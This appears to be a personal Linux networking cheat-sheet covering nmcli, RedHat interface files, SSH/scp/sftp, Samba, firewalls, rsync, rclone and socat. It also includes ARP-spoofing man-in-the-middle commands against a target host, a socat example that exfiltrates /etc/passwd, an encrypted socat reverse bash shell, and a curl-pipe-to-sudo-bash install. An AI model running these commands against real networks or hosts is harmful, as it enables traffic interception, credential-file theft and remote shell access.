        #... @ topology:  ISP  ===(eth1)===  PC  ===(eth0)===  Gateway Router

        # Disable multicast snooping:
        echo 0 > /sys/devices/virtual/net/br0/bridge/multicast_snooping
        # ... THEN RUN Wireshark on eth0 or eth1.

        # TR-069 - Protocol used by ISP (ACS) for managing CPE [CWMP] [Wikipedia]
        # REF: https://0x90.psaux.io/2020/03/01/Taking-Back-What-Is-Already-Yours-Router-Wars-Episode-I/  

    # CONFIGURE NIC PERMANENTly 
    #  Write to NetworkManager service;
    #  CLI :: nmcli, nm-tool
    #  GUI :: right-click on network icon for menu ...

        # RedHat 7 :: nmcli [NetworkManager command-line tool]  
        # See "REF.RHEL.RHCE.sh" 
        
        nmcli -f NAME,DEVICE,TYPE,UUID con show # =>
            NAME    DEVICE  TYPE            UUID
            LAN     enp1s0  802-3-ethernet  b9033960-b5c6-3f...

        nmcli dev wifi            # Show available WiFi networks; channel/strength/...
        nmcli -f ALL dev wifi     # Show available WiFi per SSID/BSSID/freq/...
        nmcli -m multiline -f ALL dev wifi  # @ multi-line view
        nmcli dev wifi rescan     # rescan 

        nmcli con show                     # show connections; NAME UUID TYPE DEVICE 
        nmcli con down NICname             # disable NICname
        nmcli con up   NICname             # enable NICname 
        nmcli general # =>
            STATE      CONNECTIVITY  WIFI-HW  WIFI     WWAN-HW  WWAN
            connected  full          enabled  enabled  enabled  enabled

        # E.g., set permanent IP
        nmcli con mod "Ifupdown"
          ipv4.addresses "HOST_IP_ADDRESS"
          ipv4.gateway "IP_GATEWAY"
          ipv4.dns "DNS_SERVER(S)"
          ipv4.dns-search "DOMAIN_NAME"
          ipv4.method "manual"

        # RedHat 6 
        service network status|stop|start|restart
    
        # ... changes stored @ ...
    
    # IP Networking Control Files http://linux-ip.net/html/basic-control-files.html
        
        # Interface definitions :: per Connection Name,'*'; [RedHat]
        ls '/etc/sysconfig/network-scripts/ifcfg-'*

        # ifcfg-LAN2 [aHOST 6]
            TYPE=Ethernet
            BOOTPROTO=dhcp
            DEFROUTE=yes
            IPV4_FAILURE_FATAL=yes
            IPV6INIT=no
            NAME=LAN2
            UUID=8f0e4775-e3b0-42fd-9d75-f467a53397ee # per connection, NOT per MAC
            ONBOOT=no
            DNS1=192.168.1.1
            DOMAIN=aDOMAIN
            HWADDR=00:23:54:7C:B8:64  # eth0
            PEERDNS=no
            PEERROUTES=yes

        # Interface definitions :: 'Routes...' [RedHat]
        ls '/etc/sysconfig/network-scripts/route-'*
        
        # route-LAN2 [aHOST 6] 
        
            ADDRESS0=192.168.1.1    # Gateway Router
            NETMASK0=255.255.255.0
            GATEWAY0=192.168.1.2    # Client-Bridge
            METRIC0=1

        # Hostname and default gateway definition [RedHat]
        cat '/etc/sysconfig/network' # cycle NIC after any change [per 'nmcli con down/up eth0']
        
            NETWORKING=yes
            NETWORKING_IPV6=no
            HOSTNAME=aHOST.aDOMAIN
            DOMAINNAME=aDOMAIN
            
        # Definition of static routes, if exist [RedHat]
        cat '/etc/sysconfig/static-routes' 

        # hosts File 
        cat '/etc/hosts'

        # DOMAIN & DNS Name Server :: resolve.conf [for viewing only; config w/ NetworkManager]
        cat '/etc/resolv.conf' # => (generated by NetworkManager)
            search aDOMAIN
            nameserver 192.168.1.1 

            # May be configured such that
            nameserver 127.0.0.1  # loopback addr
            # This means NeworkManager is using `resolve.dnsmasq`
            # e.g., ddWRT-Merlin router
            cat '/etc/resolv.conf' # => (generated by NetworkManager)
                ...
                resolv-file=/tmp/resolv.conf
                servers-file=/tmp/resolv.dnsmasq
                # then find DNS Server @ 
                cat '/tmp/resolve.conf' #=> (OpenDNS servers)  
                    nameserver 208.67.222.222
                    nameserver 208.67.220.220

        # SERVICEs/PORTs/PROTOCOL settings @ service name database file:
        /etc/services  # a columnar list: 'SERVICE  PORT/{tcp|udp}  [INFO]'

# SSH / OpenSSH a.k.a. "OpenBSD Secure Shell" :: See 'REF.Network.SSH.sh' 

    # BYOC (Bring your own creds)
    ssh -i ${_PRIVATE_KEY} ${user}@${host_name_OR_public_ip} #... e.g., ...
    ssh -i ~/.docker/machine/machines/${_VM}/id_rsa ubuntu@kvpairs.com
    
    # @ public key @ ~/.ssh/config
    ssh ${user}@${host_name_OR_public_ip}
    # OR
    ssh -l $user ${host_name_OR_public_ip}
    # OR, if `Host ...` @ `~/.ssh/config` 
    ssh xMachine
    # Host xMachine
    #   HostName centos
    #   User rbox
    #   CheckHostIP yes
    #   IdentityFile ~/.ssh/centosvm_ed25519

    # SCP :: Secure Copy  https://en.wikipedia.org/wiki/Secure_copy
        scp $source user@host:$target     # upload source FILE to host @ target
        scp -r $source user@host:$target  # upload source FOLDER to host @ target 
        scp user@host:$source $target     # download from host
            -p  # preserve mtime, atime, mode 
            -r  # recurse (folder)

        scp -i ~/.ssh/aKey.pem -r ./foo ${user}@${host}:~    # Copy local ./foo to ~/foo @ host 
        scp -i ~/.ssh/aKey.pem -r ./foo/* ${user}@${host}:~  # Copy CONTENT of local ./foo to ~/ @ host 

    # SFP :: Secure FTP (SFTP)  https://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol
    # https://www.digitalocean.com/community/tutorials/how-to-use-sftp-to-securely-transfer-files-with-a-remote-server
    # SFTP uses the SSH protocol to authenticate and establish a secure connection. Because of this, the same authentication methods are available that are present in SSH

        sfp ; scp2 ; sftp

        sftp $user@$IP_or_HOSTNAME
        sftp -oPort=${_PORT:-22} $user@$IP_or_HOSTNAME
        # sftp> help
        # sftp> ?
        # sftp> pwd
        # sftp> lpwd                        # Local equivalent
        # sftp> ls -ahl
        # sftp> lls -ahl                    # Local equivalent
        # sftp> get $path                   # Download $path 
        # sftp> get $srcFname $dstFname     # Download remote src to dst
        # sftp> put -r $localDir            # Upload a local directory


# SAMBA/CIFS
# cifs-utils samba-client samba-common [3 packages]

    # smbclient :: ftp-like client to access SMB/CIFS resources on servers
    smbclient -L netbios-name [-s config.filename] [-U username] [--option=clientusespnego=no]
    # or 
    smbclient //server/service [-s config.filename] [-U username] [--option=clientusespnego=no]
    # ... prompts for password

    # mount :: mount whatever @ temporary/current-environment [on-the-fly] 
        mkdir /media/SERVERsharename
        sudo mount -t cifs //SERVER/foldername /media/SERVERsharename -o user=winUSER,pass=winPASS[,dom=winDOMAIN]

    # show all mount[s] ...
        mount 
    # show CIFS mount[s] ...
        mount | fgrep 'cifs'
        # => //SMB/wde_40gb/40GB SAMBA on /media/SMB type cifs (rw)

    # unmount ...
        umount /media/SMB
        umount -a      # umounts ALL listed @ '/etc/mtab'
        cat /etc/mtab  # show mounts

# FIREWALL  
    firewalld      # Linux firewall daemon (See REF.RHCE.sh)
    firewall-cmd   # tool to modify firewall rules; DIRECT rules & RICH rules

	iptables  # IP Tables; tool for PACKET FILTERING and NAT [IPv4/IPv6] 
	#  an extremely powerful FIREWALL 
    # - listing contents of the PACKET FILTER RULESET
    # - adding/removing/modifying rules in PACKET FILTER RULESET
    # - listing/zeroing per-rule counters of PACKET FILTER RULESET
    # http://www.netfilter.org/ 
	# https://wiki.centos.org/HowTos/Network/IPTables
    # https://www.digitalocean.com/community/tutorials/how-to-list-and-delete-iptables-firewall-rules 

    # list rule(s); output looks just like the commands that were used to create them 
        iptables -S        # List Rules by Specification
        iptables -S TCP    # List Rules of a Specific Chain [TCP]
        iptables -L        # List Rules as Tables
        iptables -L INPUT  # List Input Chain Rule Table 

        # 4 commands to view ALL iptables rules
        # https://jvns.ca/blog/2017/06/07/iptables-basics/ [Julia Evans]
            iptables -L            # lists the filter table; implicit `-t` here
            iptables -L -t nat
            iptables -L -t mangle
            iptables -L -t raw 

	nft  # nftables [nft] is newer 'version' of iptables  
	# http://www.netfilter.org/projects/nftables/index.html

    ufw  # Uncomplicated Firewall  https://help.ubuntu.com/community/UFW
        ufw enable|disble|status 
        # BLOCK intruder per IP Address; e.g., some local [LAN] intruder here ...
            ufw block proto tcp from 192.168.8.345  
        # deny ... 
            ufw deny 53/udp  # deny UDP packets on port 53 
            ufw deny ssh     # deny all SSH connections

# hosts file
    cat /etc/hosts | head -n 15  # show hosts file [modified @ router; See REF.AsusWRT.txt]

        127.0.0.1 localhost.localdomain localhost
        192.168.1.1 router.asus.com
        192.168.1.1 www.asusnetwork.net
        192.168.1.1 www.asusrouter.com
        192.168.1.1 SMB.aDOMAIN SMB

        0.0.0.0 edition.cnn.com

        # -- per hosts script [Cygwin/MinGW/Linux] --

        0.0.0.0 006.free-counter.co.uk
        0.0.0.0 006.freecounters.co.uk
        0.0.0.0 0101011.com
        0.0.0.0 0427d7.se
        0.0.0.0 05tz2e9.com
        
        routerUser@SMB:/tmp/home/root#

# IRC 
    # an ancient text-based chat protocol that is still very popular among programmers.
    nc irc.freenode.net 6667
    # irc commands
        nick     # identify as a user
        user     # also identify as a user
        join     # join a channel
        privmsg  # send a message to a channel

    # Example ...
        nc irc.freenode.net 6667
        nick fooName
        user fooName fooName irc.freenode.net :fooName
        join    #fooChannel                     # NOTE: the '#' is part of the command
        privmsg #fooChannel :hack the planet!   # all that follows ':' is the message

# HACKing 
    # MITM (Man in the Middle) Attack 
    # per ARP Spoofing/Poisoning;
    # Attacker has LAN/WLAN access to Target/Victim thru Access Point (AP).

        arp -a    # @ target; view IP/MAC of AP (access point) a.k.a. gateway router

        # ARP Spoofing/Poisoning  https://tutorialedge.net/security/arp-spoofing-for-mitm-attack-tutorial/  
        arpspoof  # utility @ dsniff suite
        arpspoof -i $_NIC -t $_TARGET_IP $_AP_IP # now Target sees your NIC (eth0) as AP
        arpspoof -i $_NIC -t $_AP_IP $_TARGET_IP # now AP     sees your NIC (eth0) as Target

        arp -a    # @ target shows your MAC as that of AP (IP).

        # Port Forwarding (enable @ your machine, so it relays traffic) 
        echo 1 > /proc/sys/net/ipv4/ip_forward  

        # MITMf (Framework for MITM attacks)  https://github.com/byt3bl33d3r/MITMf
        mitmf --arp --spoof --gateway 10.0.2.1 --target 10.0.2.5 -i eth0

        # bettercap  https://github.com/bettercap/bettercap  

        # "Python + Ethical Hacking [FreeTutorials.Us] [Udemy]"  
        # "2. Redirecting the Flow of Packets in a Network Using arpspoof"
        # https://www.udemy.com/learn-ethical-hacking-from-scratch/  
            scapy  # Python package

    # WiFi 
        nmcli dev wifi  # See @ above
        wavemon  # S/N levels, packet statistics, device configuration and network parameters.

# Push/Pull

    rsync # net suavy copy; `ROBO /MIR ...` <==> `rsync -rtu --delete ...`
    # https://www.digitalocean.com/community/tutorials/how-to-copy-files-with-rsync-over-ssh 
    # https://en.wikipedia.org/wiki/Rsync#Examples
    # https://rsync.samba.org/examples.html
    # https://www.howtogeek.com/175008/the-non-beginners-guide-to-syncing-data-with-rsync/
        rsync [OPTION]... SRC [SRC]... DEST
        # connect via remote shell
        rsync [OPTION]... SRC [SRC]... [USER@]HOST:DEST  # PUSH
        rsync [OPTION]... [USER@]HOST:SRC [DEST]         # PULL
        #... utilizes SSH keys (sans password) if `[USER@]HOST` is so configured; see ~/.ssh/config 
        # per rsync daemon; require SRC or DEST to start with a module name.

        # options
            -a  # archive mode; equals `-rlptgoD` 
            -c  # per checksum (slower), NOT timestamp (mtime), comparisons
            -i  # info-summary only
            -l  # symlinks as symlinks 
            -r  # recurse 
            -t  # preserve mod-times 
            -C  # per CVS auto-ignore rules
            -n  # dry-run; lists abs-paths
            -p  # perms preserved
            -A  # ACLs preserved
            -e  # specify the remote shell (+ its config) 
            -u  # update; skip newer @ target 
            -v  # verbose 
            -z  # compress during transfer (uncompress @ DEST) 
            --delete   # del extras @ target
            --partial  # keep partially transferred files

                # E.g., MIRROR (without overwriting newer @ DEST)
                    -auz --delete 
                # E.g., CLONE 
                    -az --delete

            # filtering >>>  WARNING: VERY TRICKY SYNTAX; triple test before using.  <<<
                --exclude  # UNDOCUMENTED option (except for an example) 
                -F --exclude=PATTERN  # note various different syntaxes for these; see below
                -F --include=PATTERN  
                --filter=RULE
                --prune-empty-dirs
                # E.g.,
                    --exclude '/.git/*'  # VERY tricky syntax; TRIPLE TEST before using 
                    -F --exclude={"/dev/*","/proc/*","/sys/*","/tmp/*","/run/*","/mnt/*","/media/*","/lost+found"} 
                    -F --include=*.png
                    -F --include='*/*_???_StAtIc*'
                    --filter=-! */       # exclude all else; ALWAYS USE with `--include=...`
            # other options 
                --modify-window=SECONDS  # reduce accuracy @ timestamp comps; e.g., `2` for FAT

                --files-from="$_REL_PATHS_LIST"
                    # READ paths FROM FILE; very limited/rigid requirement; 
                    #   MUST be of rel-paths; MUST SHARE ONE PARENT,
                    #   and rebuilds entire source dir hierarchy at target
                    rsync -itu --files-from="$_REL_PATHS_LIST" "${_PARENT_PATH}/" "${_TARGET}/"

            # TRAILING BACKSLASH required, 
            #   else source copies to SUBDIR @ target, i.e., 
            #   /source  => target/source
            #   /source/ => /target 

        # PUSH to AWS VM :: from local $PWD to remote $HOME/assets/ 
        #... dst dir, `~/assets`, is CREATED if not exist.
        _PRIVATE_KEY=~/.ssh/swarm-aws.pem
        _USER='ubuntu'  
        _HOST='54.234.246.103'

        rsync -atuz -e "ssh -i $_PRIVATE_KEY" ./ ${_USER}@${_HOST}:~/assets/

        # MIRROR (without overwriting newer @ target)
        rsync -auz --delete "${_SOURCE}/" "$_TARGET/"

        # CLONE
        rsync -az --delete "${_SOURCE}/" "$_TARGET/"

        # copy root files only; no sub-dirs
        rsync -itu "${_SOURCE}/"* "$_TARGET/"

        # copy ONE dir, recursively
        rsync -itudr "${_SOURCE}/thisone" "$_TARGET/"

        # copy ONE FILE [create/update; preserver-mtime; pre-alloc space] ...
        rsync -itu --preallocate "${_SOURCE}/$_FILE" "${_TARGET}/" 
        
        # REMOTE per SSH
            # if SSH keys/creds validated; password-less connect 
            # dirs
            rsync -atuz "${_SOURCE}/" ${_USER}@${_HOST}:"$_TARGET/"  # push
            rsync -atuz ${_USER}@${_HOST}:"${_SOURCE}/" "$_TARGET/"  # pull
            # one file
            rsync -atvz "$_SOURCE" ${_USER}@${_HOST}:"$_TARGET"  # push
            rsync -atvz ${_USER}@${_HOST}:"$_SOURCE" "$_TARGET"  # pull

            # if SSH identity required
            rsync -atuze "ssh -i $_ID_FILE" ...

            # MIRROR DIRS
            # Push (Upload)
            rsync -atuz --delete --progress -e "ssh -i $_ID_FILE" "${_SOURCE_DIR}/" ${_USER}@${_HOST}:"${_TARGET_DIR}/"
            # Pull (Download)
            rsync -atuz --delete --progress -e "ssh -i $_ID_FILE" ${_USER}@${_HOST}:"${_SOURCE_DIR}/" "${_TARGET_DIR}/"

                # Purportedly needed under certain SSH configs ...
                "ssh -i $_ID_FILE -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"

        # copy one file-type [$_TYPE]
        rsync -irtu --include="*/" --include="*.$_TYPE" --exclude="*" "${_FROM}/" "$_TO/"
    
        # CHANGEd files only; per checksum, not timestamp 
        rsync -rcnC --out-format="%f" "${_OLD}/" "$_NEW/" # OLDer; Deleted or (pre)Modified
        rsync -rcnC --out-format="%f" "${_NEW}/" "$_OLD/" # NEWer; Added or (post)Modified

    rclone  # rsync for cloud storage services 
        rclone [COMMAND] [FLAGS]  # sans arg, it lists commands
        # Install  https://rclone.org/downloads/  
        curl https://rclone.org/install.sh | sudo bash  
        # Config; interactive; provides URL that returns OAuth token 
        rclone config  # 'rclone.conf' stored @ ~/.config/rclone/ 
        # Synch; skip per checksum (-c), not  mtime, match
        rclone sync $_SRC $_REMOTE:$_DST -c 
            # E.g., between local path & Google Drive 
            _SRC='/d/foo/dog'  # Local path 
            _REMOTE='goog'     # Config name @ rclone.conf 
            _DST='bar/cat'     # Remote path
        # Download from cloud 
        rclone copy $_REMOTE:$_SRC $_DST  # DST is container (parent) 

# UNIX domain (IPC) Sockets : REF.sockets.UNIX.TCP.md
 
socat  # SOcket CAT : netcat for sockets : multipurpose relay
    # bidirectional data transfers btwn two independent data channels (byte streams);
    # 4 phases : init, open, transfer, close
    # man page : https://linux.die.net/man/1/socat 
    # article  : https://www.redhat.com/sysadmin/getting-started-socat
    # article  : https://www.baeldung.com/linux/socat-command

    socat [options] $_ADDRESS $_ADDRESS # Address syntax: protocol:ip:port
    socat -h[h[h]]  # List options and address types
    socat -d[d[d]]  # Verbosity

    # Exfiltrate a file : Neither OPEN nor FILE are documented
        # Listener
        socat -d -d TCP-LISTEN:1234 OPEN:got_etc_passwd_file.txt,creat
        # Connect 
        socat -d -d TCP-CONNECT:127.0.0.1:1234 FILE:/etc/passwd

    # Get time from time server
    socat TCP:time.nist.gov:13 -
    # Forward port, changing the protocol
    socal TCP-LISTEN:1234 UDP-LISTEN:4321
    # Forward local port to remote
    socat TCP-LISTEN:80,fork TCP:www.domain.org:80
    # Forward terminal to the serial port COM1:
    socat READLINE,history=$HOME/.cmd_history /dev/ttyS0,raw,echo=0,crnl 
    # Open bash shell at remote, tunneled across an SSL connection; OpenSSL sans ssl.
        # Client : Create a self-signed cert (and its key)
        openssl req -newkey rsa:2048 -nodes -keyout cert.key -x509 -days 1000 -out cert.crt
        # Client : Create PEM from key and cert
        cat cert.key cert.crt > sslkey.pem 
        # Client : Listener : self signing necessitates `verify=0`.
        socat -d -d OPENSSL-LISTEN:1234,cert=sslkey.pem,verify=0
        # Server : Connector : execute the shell and forward it, encrypted per OpenSSL
        socat -d -d OPENSSL-CONNECT:127.0.0.1:1234,verify=0 EXEC:/bin/bash

    # Run bash script at server, and monitor it at the client (preserving script output)
        # Client : Connector
        socat TCP-CONNECT:$ip4_addr:1234 file:$(tty),rawer
        # Server : Listener
        socat -R /dev/stdout TCP-LISTEN:1234,reuseaddr EXEC:$script_path,pty,stderr,setsid,sane


